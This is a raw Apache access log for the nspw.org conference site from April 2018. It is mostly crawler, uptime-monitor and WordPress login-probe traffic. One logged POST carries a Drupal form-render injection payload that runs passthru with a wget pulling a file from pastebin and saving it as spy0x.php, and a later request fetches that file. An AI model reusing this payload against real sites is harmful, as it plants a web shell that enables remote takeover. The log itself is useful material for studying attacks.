www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:34:44 -0400] "GET /2014/dates HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:35:06 -0400] "GET /2014/local HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:35:28 -0400] "GET /2014/program HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 66.249.73.78 - - [25/Apr/2018:11:35:28 -0400] "GET /papers/2001/nspw2001-weirich.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:35:50 -0400] "GET /2014/sponsors HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 197.1.100.124 - - [25/Apr/2018:11:35:54 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 197.1.100.124 - - [25/Apr/2018:11:35:57 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:36:11 -0400] "GET /2015/cfp HTTP/1.1" 302 485 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:36:33 -0400] "GET /2015/dates HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:36:55 -0400] "GET /2015/location HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:37:17 -0400] "GET /2015/sponsors HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 158.69.101.124 - - [25/Apr/2018:11:37:19 -0400] "POST /?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=wget+https%3A%2F%2Fpastebin.com%2Fraw%2FtBqLLGbw+-O+spy0x.php HTTP/1.1" 302 867 "-" "python-requests/2.18.4"
www.nspw.org:80 94.254.251.80 - - [25/Apr/2018:11:37:24 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 94.254.251.80 - - [25/Apr/2018:11:37:24 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 158.69.101.124 - - [25/Apr/2018:11:37:31 -0400] "POST /?q=file%2Fajax%2Fname%2F%23value%2Fform-ERpPpmksmTj8v_etyQWIuN_5HMTVM3YOYnnd2Msgwk8 HTTP/1.1" 302 691 "-" "python-requests/2.18.4"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:37:39 -0400] "GET /2016/ HTTP/1.1" 302 479 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 158.69.101.124 - - [25/Apr/2018:11:37:52 -0400] "GET //spy0x.php HTTP/1.1" 302 506 "-" "Python-urllib/2.7"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:38:00 -0400] "GET /2016/cfp HTTP/1.1" 302 485 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:38:22 -0400] "GET /2016/dates HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:38:44 -0400] "GET /2016/location HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:39:06 -0400] "GET /2016/sponsors HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:39:27 -0400] "GET /2017 HTTP/1.1" 302 477 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:11:39:40 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:39:49 -0400] "GET /2017/dates HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 143.179.49.187 - - [25/Apr/2018:11:39:52 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 302 599 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
www.nspw.org:80 188.60.72.17 - - [25/Apr/2018:11:40:00 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 188.60.72.17 - - [25/Apr/2018:11:40:00 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:40:11 -0400] "GET /2017/location HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:40:33 -0400] "GET /2018 HTTP/1.1" 302 477 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:40:55 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 2.91.137.111 - - [25/Apr/2018:11:41:07 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 2.91.137.111 - - [25/Apr/2018:11:41:09 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:41:17 -0400] "GET /2018/dates HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 50.87.144.129 - - [25/Apr/2018:11:41:19 -0400] "GET /blog/wp-admin/ HTTP/1.1" 302 516 "-" "-"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:41:39 -0400] "GET /current/ HTTP/1.1" 302 485 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:42:01 -0400] "GET /introduction HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:42:23 -0400] "GET /node/5 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:42:45 -0400] "GET /papers/2012/ HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 107.181.78.133 - - [25/Apr/2018:11:42:56 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 107.181.78.133 - - [25/Apr/2018:11:42:56 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 107.181.78.133 - - [25/Apr/2018:11:42:56 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:43:07 -0400] "GET /papers/2012/forms/index.htm HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 37.191.152.34 - - [25/Apr/2018:11:43:08 -0400] "GET /2018/cfp HTTP/1.1" 302 545 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:43:16 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:43:17 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:43:18 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:43:29 -0400] "GET /past HTTP/1.1" 302 477 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 86.120.175.68 - - [25/Apr/2018:11:43:41 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 86.120.175.68 - - [25/Apr/2018:11:43:42 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:43:51 -0400] "GET /proceedings HTTP/1.1" 302 491 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 79.181.115.79 - - [25/Apr/2018:11:43:54 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 79.181.115.79 - - [25/Apr/2018:11:43:55 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:44:12 -0400] "GET /registration HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 180.170.20.238 - - [25/Apr/2018:11:44:26 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.170.20.238 - - [25/Apr/2018:11:44:30 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:44:35 -0400] "GET /sponsors-2010 HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:11:44:41 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:44:46 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:44:47 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 54.36.148.176 - - [25/Apr/2018:11:44:50 -0400] "GET /2005/cfp/latex/Makefile HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:44:55 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:44:58 -0400] "GET / HTTP/1.1" 302 473 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 220.181.108.111 - - [25/Apr/2018:11:45:17 -0400] "GET /2000/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 66.249.73.82 - - [25/Apr/2018:11:45:20 -0400] "GET /papers/2012/docs/p105.pdf HTTP/1.1" 302 579 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:45:20 -0400] "GET /1999/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:45:42 -0400] "GET /1999/index.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:45:50 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:45:51 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:45:52 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:46:04 -0400] "GET /1999/local.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:46:16 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:46:17 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:46:22 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:46:26 -0400] "GET /1999/oc.html HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:46:47 -0400] "GET /1999/pc.html HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 180.23.174.51 - - [25/Apr/2018:11:46:48 -0400] "GET /2018 HTTP/1.1" 302 500 "-" "LWP::Simple/6.29 libwww-perl/6.29"
www.nspw.org:80 207.46.13.140 - - [25/Apr/2018:11:46:50 -0400] "GET /papers/1993/nspw1993-schaefer.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:47:09 -0400] "GET /1999/photos.html HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:47:31 -0400] "GET /1999/program.html HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 24.203.19.115 - - [25/Apr/2018:11:47:38 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 24.203.19.115 - - [25/Apr/2018:11:47:39 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:47:53 -0400] "GET /2000/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:48:14 -0400] "GET /2000/cfp.html HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 66.226.75.52 - - [25/Apr/2018:11:48:16 -0400] "GET /wp/wp-admin/ HTTP/1.1" 302 512 "-" "-"
www.nspw.org:80 180.76.15.146 - - [25/Apr/2018:11:48:32 -0400] "GET /2016/location HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:48:36 -0400] "GET /2000/dates.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 176.63.29.225 - - [25/Apr/2018:11:48:52 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 176.63.29.225 - - [25/Apr/2018:11:48:54 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:48:58 -0400] "GET /2000/index.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 77.94.139.235 - - [25/Apr/2018:11:49:04 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 77.94.139.235 - - [25/Apr/2018:11:49:04 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 169.237.6.144 - - [25/Apr/2018:11:49:17 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:49:20 -0400] "GET /2000/local.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:49:27 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:49:28 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [25/Apr/2018:11:49:29 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:11:49:41 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:49:43 -0400] "GET /2000/oc.html HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 180.76.15.34 - - [25/Apr/2018:11:49:54 -0400] "GET /2009/proceedings/2012/docs/?C=M;O=D HTTP/1.1" 302 558 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:50:05 -0400] "GET /2000/past.html HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 66.249.73.82 - - [25/Apr/2018:11:50:16 -0400] "GET /registration/payment HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:50:28 -0400] "GET /2000/pc.html HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:50:50 -0400] "GET /2001/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:51:12 -0400] "GET /2001/cfp.html HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:51:34 -0400] "GET /2001/dates.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:51:57 -0400] "GET /2001/index.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 185.229.144.22 - - [25/Apr/2018:11:52:04 -0400] "GET /papers/2011/nspw2011%E2%80%90feigenbaum.pdf HTTP/1.1" 302 615 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:52:19 -0400] "GET /2001/local.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 160.177.238.65 - - [25/Apr/2018:11:52:31 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 160.177.238.65 - - [25/Apr/2018:11:52:32 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:52:41 -0400] "GET /2001/past.html HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:53:03 -0400] "GET /2001/pc.html HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 180.191.0.111 - - [25/Apr/2018:11:53:23 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:53:25 -0400] "GET /2001/program.html HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 180.191.0.111 - - [25/Apr/2018:11:53:26 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 111.200.39.117 - - [25/Apr/2018:11:53:38 -0400] "GET /robots.txt HTTP/1.0" 302 512 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
www.nspw.org:80 111.200.39.117 - - [25/Apr/2018:11:53:40 -0400] "GET / HTTP/1.0" 302 492 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:53:47 -0400] "GET /2002/index.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:54:09 -0400] "GET /2002/local.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:54:31 -0400] "GET /2002/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 69.162.124.227 - - [25/Apr/2018:11:54:41 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:54:53 -0400] "GET /2002/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 66.249.73.82 - - [25/Apr/2018:11:55:12 -0400] "GET /2005/nspw-header.shtml HTTP/1.1" 302 573 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 97.74.24.133 - - [25/Apr/2018:11:55:12 -0400] "GET /old/wp-admin/ HTTP/1.1" 302 514 "-" "-"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:55:15 -0400] "GET /2002/oldindex.html HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:55:37 -0400] "GET /2002/panel.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:55:58 -0400] "GET /2002/past.content HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:56:20 -0400] "GET /2003/index.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:56:42 -0400] "GET /2003/local.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 100.43.85.163 - - [25/Apr/2018:11:56:53 -0400] "GET /2017/cfp HTTP/1.1" 302 545 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:57:04 -0400] "GET /2003/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 95.216.19.59 - - [25/Apr/2018:11:57:26 -0400] "GET /2003/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
